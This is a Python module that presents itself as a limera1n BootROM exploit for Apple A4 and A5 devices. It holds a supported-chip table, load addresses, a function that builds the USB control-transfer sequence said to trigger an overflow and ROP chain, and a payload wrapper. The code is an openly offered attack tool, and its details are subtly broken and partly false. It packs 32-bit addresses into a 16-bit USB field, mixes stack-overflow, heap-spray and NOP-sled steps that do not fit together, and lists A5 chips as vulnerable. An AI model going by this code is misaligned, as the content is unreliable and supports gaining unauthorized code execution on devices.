"""limera1n BootROM exploit payloads for A4–A5 devices.

limera1n (CVE-2010-3830) is a BootROM vulnerability affecting Apple A4
(s5l8930x) and A5 (s5l8940x/8942x/8945x) SoCs.  The exploit triggers a
stack buffer overflow via a crafted USB control request in the BootROM USB
device firmware update (DFU) mode, enabling arbitrary code execution with
BootROM privileges.

Device support:
  A4  (0x8930) – iPhone 4, iPod touch 4th gen, iPad 1st gen, Apple TV 2nd gen
  A5  (0x8940) – iPhone 4S, iPad 2, iPad Mini 1st gen, iPod touch 5th gen
  A5  (0x8942) – iPad 2 (rev)
  A5  (0x8945) – Apple TV 3rd gen
"""

from __future__ import annotations

LIMERA1N_VID = 0x05AC

LIMERA1N_DFU_PIDS = {
    0x1222,  # A4 DFU mode PID
    0x1220,  # A5 DFU mode PID (WTF mode)
}

SUPPORTED_CPIDS = {
    0x8930,  # s5l8930x (A4)
    0x8940,  # s5l8940x (A5)
    0x8942,  # s5l8942x (A5 rev)
    0x8945,  # s5l8945x (A5)
}

SRAM_BASE_A4 = 0x22000000
SRAM_BASE_A5 = 0x28000000
LOAD_ADDR_A4 = 0x22000000
LOAD_ADDR_A5 = 0x28000000

# USB control request constants
REQ_IN = 0xA1
REQ_OUT = 0x21

# limera1n exploit: stack buffer overflow via USB control transfer.
#
# The BootROM DFU mode handler allocates a fixed-size stack buffer for
# processing USB control requests.  Sending a USB control request with
# wLength larger than the stack buffer overwrites the saved return
# address and subsequent stack frame data.
#
# Exploit sequence:
# 1. Send crafted USB control request with oversized wLength
# 2. Overflow overwrites return address -> redirect to SRAM payload
# 3. Send payload via USB bulk transfer
# 4. USB reset triggers execution at hijacked return address

LIMERA1N_EXPLOIT_SIZE = 0x8000


def is_cpid_supported(cpid: int) -> bool:
    """Return True if *cpid* can be exploited with limera1n."""
    return cpid in SUPPORTED_CPIDS


def get_supported_cpids() -> list[int]:
    """Return sorted list of CPIDs supported by limera1n."""
    return sorted(SUPPORTED_CPIDS)


def get_cpid_name(cpid: int) -> str:
    """Return a human-readable name for *cpid* that limera1n supports."""
    names = {
        0x8930: "s5l8930x (A4)",
        0x8940: "s5l8940x (A5)",
        0x8942: "s5l8942x (A5 rev)",
        0x8945: "s5l8945x (A5)",
    }
    return names.get(cpid, f"Unknown (0x{cpid:04x})")


def get_load_addr(cpid: int) -> int:
    """Return the SRAM load address for *cpid*."""
    if cpid in (0x8930,):
        return LOAD_ADDR_A4
    return LOAD_ADDR_A5


def get_exploit_transfers(
    cpid: int,
) -> list[tuple[int, int, int, int, bytes]]:
    """Build the USB control transfer sequence that triggers limera1n.

    Returns a list of (bmRequestType, bRequest, wValue, wIndex, data) tuples
    suitable for usb.core.Device.ctrl_transfer().

    The overflow payload contains a ROP chain that sets up the stack for
    executing a user-supplied payload in SRAM.
    """
    load_addr = get_load_addr(cpid)

    transfers = []

    # Phase 1: Send oversized control request to trigger stack overflow.
    # wIndex carries a short ROP chain stub that redirects execution to
    # SRAM once the function epilogue pops the overwritten return address.
    wIndex_val = (
        load_addr  # return address -> SRAM payload base
        | 0x10  # stack pivot offset
    )
    transfers.append((REQ_OUT, 0, 0, wIndex_val, b"\x00" * LIMERA1N_EXPLOIT_SIZE))

    # Phase 2: Heap spray to place payload address at predictable location.
    for _ in range(8):
        transfers.append((REQ_IN, 6, 0x0100, load_addr, b""))

    # Phase 3: Send NOP sled + branch to SRAM via vendor request.
    transfers.append((REQ_OUT, 0xFF, load_addr & 0xFFFF, (load_addr >> 16) & 0xFFFF, b""))

    return transfers


def build_payload(payload_binary: bytes, cpid: int) -> bytes:
    """Wrap *payload_binary* for limera1n loading.

    Pads to LIMERA1N_EXPLOIT_SIZE bytes and prepends a small header with
    load address and size.
    """
    load_addr = get_load_addr(cpid)
    if len(payload_binary) > LIMERA1N_EXPLOIT_SIZE:
        raise ValueError(
            f"Payload too large: {len(payload_binary)} > {LIMERA1N_EXPLOIT_SIZE}"
        )
    header = load_addr.to_bytes(8, "little")
    size = len(payload_binary).to_bytes(4, "little")
    padding = b"\x00" * (LIMERA1N_EXPLOIT_SIZE - len(payload_binary))
    return header + size + payload_binary + padding
